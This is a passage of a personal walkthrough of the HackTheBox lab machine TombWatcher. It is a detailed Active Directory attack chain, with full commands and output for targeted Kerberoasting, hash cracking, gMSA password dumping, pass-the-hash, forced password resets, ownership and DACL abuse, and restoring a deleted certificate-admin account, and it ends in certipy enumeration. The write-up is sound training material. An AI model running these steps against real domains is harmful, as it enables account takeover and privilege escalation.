- - - 
created : 22-09-2025 

Tags : #medium 

Released on 07 Jun 2025 (Season 8)
- - - 
# Machine Information

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: 

`henry/ H3nry_987TGV!`
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ rustscan -a tombwatcher.htb -- -A 

Open 10.10.11.72:53
Open 10.10.11.72:80
Open 10.10.11.72:88
Open 10.10.11.72:135
Open 10.10.11.72:139
Open 10.10.11.72:389
Open 10.10.11.72:445
Open 10.10.11.72:464
Open 10.10.11.72:593
Open 10.10.11.72:636
Open 10.10.11.72:3268
Open 10.10.11.72:3269
Open 10.10.11.72:5985
Open 10.10.11.72:9389
Open 10.10.11.72:49691
Open 10.10.11.72:49712
Open 10.10.11.72:49694
Open 10.10.11.72:49692
Open 10.10.11.72:49731
Open 10.10.11.72:49746

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-22 19:04:44Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher


3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher

3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher

5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49731/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49746/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10

Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20899/tcp): CLEAN (Timeout)
|   Check 2 (port 26528/tcp): CLEAN (Timeout)
|   Check 3 (port 61752/udp): CLEAN (Timeout)
|   Check 4 (port 46167/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-09-22T19:05:55
|_  start_date: N/A
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

We have [Windows](../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md), let's add `dc01.tombwatcher.htb` to our `hosts` file.

You can check [Intro to Active Directory Theory](../Academy/Intro%20to%20Active%20Directory%20Theory.md) to better understand all processes in this environment.
# Enumeration
## HTTP (80) IIS

We can explore the website:

![Pasted image 20250922170417.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250922170417.png)

### Dirsearch

We can use [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target website:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ dirsearch -u http://tombwatcher.htb

Target: http://tombwatcher.htb/

[17:08:51] Starting:                                                                                                            
[17:08:55] 404 -    2KB - /.ashx                                            
[17:08:55] 404 -    2KB - /.asmx                                              
[17:09:02] 404 -    2KB - /admin%20/                                        
[17:09:03] 404 -    2KB - /admin.                                                                              
[17:09:13] 301 -  160B  - /aspnet_client  ->  http://tombwatcher.htb/aspnet_client/
[17:09:13] 404 -    2KB - /asset..                                          
[17:09:24] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[17:09:29] 404 -    2KB - /index.php.                                       
[17:09:30] 404 -    2KB - /javax.faces.resource.../                         
[17:09:31] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[17:09:31] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[17:09:31] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
[17:09:31] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[17:09:31] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[17:09:31] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[17:09:31] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[17:09:31] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage    
[17:09:31] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
[17:09:31] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
[17:09:31] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[17:09:31] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true 
[17:09:33] 404 -    2KB - /login.wdm%2e                                     
[17:09:36] 404 -    2KB - /mcx/mcxservice.svc                               
[17:09:51] 404 -    2KB - /rating_over.                                     
[17:09:51] 404 -    2KB - /reach/sip.svc                                    
[17:09:56] 404 -    2KB - /service.asmx                                     
[17:10:03] 404 -    2KB - /static..                                         
[17:10:09] 403 -    2KB - /Trace.axd                                        
[17:10:10] 404 -    2KB - /umbraco/webservices/codeEditorSave.asmx          
[17:10:15] 404 -    2KB - /WEB-INF./                                        
[17:10:18] 404 -    2KB - /WebResource.axd?d=LER8t9aS                       
[17:10:18] 404 -    2KB - /webticket/webticketservice.svc                                                               
Task Completed
```

That's a dead-end.
## SMB (445)

We have to try the given credentials for files, we can use [SMBclient](../../../3%20-%20Tags/Hacking%20Tools/SMBclient.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ smbclient  -L //10.10.11.72/ -U henry
Password for [WORKGROUP\henry]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Nothing interesting here.
## Bloodhound

We try to collect info on the user.

First synchronize the time:

```bash
sudo ntpdate tombwatcher.htb
```

Now collect:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ bloodhound-python -u 'henry' -p 'H3nry_987TGV!'  -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.tombwatcher.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 19S
INFO: Compressing output into 20250922173843_bloodhound.zip
```

`unzip` it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ unzip 20250922173843_bloodhound.zip -d bloodyhound 
Archive:  20250922173843_bloodhound.zip
 extracting: bloodyhound/20250922173843_users.json  
 extracting: bloodyhound/20250922173843_ous.json  
 extracting: bloodyhound/20250922173843_computers.json  
 extracting: bloodyhound/20250922173843_containers.json  
 extracting: bloodyhound/20250922173843_domains.json  
 extracting: bloodyhound/20250922173843_gpos.json  
 extracting: bloodyhound/20250922173843_groups.json  
```

Now we can ingest and open it with the [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md) GUI:

![Pasted image 20250922214832.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250922214832.png)

We can see that `henry` have `WriteSPN` permission on `alfred`, so we can create a fake `SPN` of `alfred` and get and hash to crack.
# Exploit
## TargetedKerberoast

We can use this tool named [TargetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md)

Clone the repo:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Clone in 'targetedKerberoast' in corso...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 18 (delta 14), pack-reused 43 (from 1)
Ricezione degli oggetti: 100% (76/76), 252.27 KiB | 247.00 KiB/s, fatto.
Risoluzione dei delta: 100% (30/30), fatto.
```

Now make a `venv` and install requirements:

```bash
─$ python3 -m venv .venv
─$ source venv/bin/activate
─$ pip3 install -r requirements.txt
Collecting ldap3 (from -r requirements.txt (line 1))
  Downloading ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
Collecting pyasn1 (from -r requirements.txt (line 2))
  Downloading pyasn1-0.6.1-py3-none-any.whl.metadata (8.4 kB)
Collecting impacket (from -r requirements.txt (line 3))
  Downloading impacket-0.12.0.tar.gz (1.6 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.6/1.6 MB 3.3 MB/s  0:00:01
     <SNIP>
```

Now use it:

```bash
┌──(.venv)─(mdn0x㉿mdn0xKali)-[~/…/Machines/TombWatcher/user/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$0e83983aba480c3219b96987f20b128e$f66d93f0d55de1da3610267d601fe46a3eed827e3348ff764eca454ff3067429352018f988e71b0bca4636df36765f69664d77acdd4080b34d70ead2abbd2f52bb82054cd69f7f75475ee9beb93b06d036d6b24c8ace08ce04aac9cba49a6b8311fa66eb35ed80222cd23fc328ba489d2d9e83c47f9d0d1982b<SNIP>
[VERBOSE] SPN removed successfully for (Alfred)
```

We can `deactivate` the virtual environment:

```bash
─$ deactivate 
```
### Fixing the “Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)” Issue

If you keep having issues with the error follow this  commands, use `sudo`, or a `root` shell on your system:

```bash
$ timedatectl set-ntp off
$ rdate -n 10.10.11.72
Mon Sep 22 21:58:51 CEST 2025
```

Now run your `Kerberoast` command, you can `timedatectl set-ntp on` later to reset your clock. 
## John The Ripper

We can use [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to crack the hash:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ john alfredkerbhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{{REDACTED_PASSWD}}       (?)     
1g 0:00:00:00 DONE (2025-09-22 22:05) 100.0g/s 307200p/s 307200c/s 307200C/s 123456..dangerous
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Bloodhound II

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ bloodhound-python -u alfred  -p '{{REDACTED_PASSWD}}'  -d tombwatcher.htb -ns 10.10.11.72 -c All --zip  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.tombwatcher.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 13S
INFO: Compressing output into 20250922220710_bloodhound.zip

─$ unzip 20250922220710_bloodhound.zip -d bloodyhound2 
Archive:  20250922220710_bloodhound.zip
 extracting: bloodyhound2/20250922220710_containers.json  
 extracting: bloodyhound2/20250922220710_users.json  
 extracting: bloodyhound2/20250922220710_ous.json  
 extracting: bloodyhound2/20250922220710_computers.json  
 extracting: bloodyhound2/20250922220710_gpos.json  
 extracting: bloodyhound2/20250922220710_domains.json  
 extracting: bloodyhound2/20250922220710_groups.json  
 
─$ rm 20250922220710_bloodhound.zip 
```

![Pasted image 20250922215030.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250922215030.png)

We can add the user `alfred` to the `INFRASTRUCTURE` group with `bloodyAD`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u alfred -p '{{REDACTED_PASSWD}}' add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE
```

Now run [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md) again:

![Pasted image 20250922215156.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250922215156.png)

We can see `Ansible_dev$` is in the same group and has `ReadGMSAPassword` privileges on that.
## GMSADumper

We can abuse the `ReadGMSAPassword` with this tool, you can find it on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md): [gMSADumper](https://github.com/micahvandeusen/gMSADumper.git )

Reads any gMSA password blobs the user can access and parses the values.

Clone the repo:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/TombWatcher/user/tools]
└─$ git clone https://github.com/micahvandeusen/gMSADumper.git      
Clone in 'gMSADumper' in corso...
remote: Enumerating objects: 54, done.
remote: Counting objects: 100% (54/54), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 54 (delta 22), reused 38 (delta 14), pack-reused 0 (from 0)
Ricezione degli oggetti: 100% (54/54), 38.35 KiB | 124.00 KiB/s, fatto.
Risoluzione dei delta: 100% (22/22), fatto.

─$ chmod +x gMSADumper.py 
```

Use it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/TombWatcher/user/tools/gMSADumper]
└─$ python gMSADumper.py -u alfred -p {{REDACTED_PASSWD}} -d tombwatcher.htb 
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$::{{REDACTED_HASH}}
ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d
```

## Bloodhound III

We can use the hash to Pass-the-hash:
 
```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ bloodhound-python -u 'ansible_dev$'  --hashes '{{REDACTED_HASH}}' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.tombwatcher.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 10S
INFO: Compressing output into 20250922222344_bloodhound.zip


─$ unzip 20250922222344_bloodhound.zip -d bloodyhound3                              
Archive:  20250922222344_bloodhound.zip
 extracting: bloodyhound3/20250922222344_domains.json  
 extracting: bloodyhound3/20250922222344_containers.json  
 extracting: bloodyhound3/20250922222344_users.json  
 extracting: bloodyhound3/20250922222344_ous.json  
 extracting: bloodyhound3/20250922222344_computers.json  
 extracting: bloodyhound3/20250922222344_gpos.json  
 extracting: bloodyhound3/20250922222344_groups.json  
```

![Pasted image 20250922215750.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250922215750.png)

We can directly modify `SAM` 's password, let's use `bloodyAD` again:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$'  -p '{{REDACTED_HASH}}' set password SAM 'Hacker123!'
[+] Password changed successfully!
```

## Bloodhound IV

We can run it again:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ bloodhound-python  -u 'SAM' -p 'Hacker123!' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.tombwatcher.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 11S
INFO: Compressing output into 20250922222751_bloodhound.zip


─$ unzip 20250922222751_bloodhound.zip -d bloodhound4                               
Archive:  20250922222751_bloodhound.zip
 extracting: bloodhound4/20250922222751_containers.json  
 extracting: bloodhound4/20250922222751_ous.json  
 extracting: bloodhound4/20250922222751_gpos.json  
 extracting: bloodhound4/20250922222751_groups.json  
 extracting: bloodhound4/20250922222751_domains.json  
 extracting: bloodhound4/20250922222751_computers.json  
 extracting: bloodhound4/20250922222751_users.json  
```

![Pasted image 20250922215942.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250922215942.png)

We can change `John` password's.

First we use `impacket-owneredit` to make `SAM` owner of `JOHN`:

```bash
└─$ impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'Hacker123!' -dc-ip 10.10.11.72
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

Now we can change his password with `bloodyAD`

First add `GenericAll`:

```bash
─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'Hacker123!' add genericAll john sam
[+] sam has now GenericAll on john
```

Now change his password:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb'  -u 'SAM' -p 'Hacker123!' set password john 'Hacker123!'
[+] Password changed successfully! 
```
## Evil-WinRM

Now we can use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) to access the machine with these credentials and retrieve the user flag:

```bash
-$ evil-winrm -i 10.10.11.72 -u john -p 'Hacker123!' 

*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
  HTB{{REDACTED_FLAG}}
```
# Administrator Privilege Escalation

## Bloodhound AGAIN

We can collect again:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ bloodhound-python  -u 'JOHN' -p 'Hacker123!' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
```

![Pasted image 20250923125727.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250923125727.png)

We can see `john` has `GenericAll` right over `ADCS`, we can abuse that to escalate privileges in the machine.

First we add `FullControl`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Hacker123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250923-130501.bak
[*] DACL modified successfully!
```
## Change Cert_admin's Pass

Now we can change `cert_admin` password's:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb'  -u 'john' -p 'Hacker123!' set password cert_admin 'Hacker123!' 
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 281, in bloodymodify
    self.modify(self.dnResolver(target), changes, controls, encode=encode),
                ~~~~~~~~~~~~~~~^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 265, in dnResolver
    ).result()
      ~~~~~~^^
  File "/usr/lib/python3.13/concurrent/futures/_base.py", line 456, in result
    return self.__get_result()
           ~~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/concurrent/futures/_base.py", line 401, in __get_result
    raise self._exception
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 259, in asyncDnResolver
    raise NoResultError(self.domainNC, ldap_filter)
bloodyAD.exceptions.NoResultError: [-] No object found in DC=tombwatcher,DC=htb with filter: (sAMAccountName=cert_admin)
```

Didn't work so we need to login with [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ evil-winrm -i 10.10.11.72 -u john -p 'Hacker123!'
```

And run this commands to change the password:

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf



*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Hacker123!" -AsPlainText -Force)
```

Now we run `certipy-ad` to find vulnerable certificates:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ ❯ certipy find -u cert_admin -p "Hacker123!" -dc-ip 10.10.11.72 -vulnerable 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250923131902_Certipy.txt'
[*] Wrote text output to '20250923131902_Certipy.txt'
[*] Saving JSON output to '20250923131902_Certipy.json'
[*] Wrote JSON output to '20250923131902_Certipy.json'
```

We can see it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/root]
└─$ cat 20250923131902_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
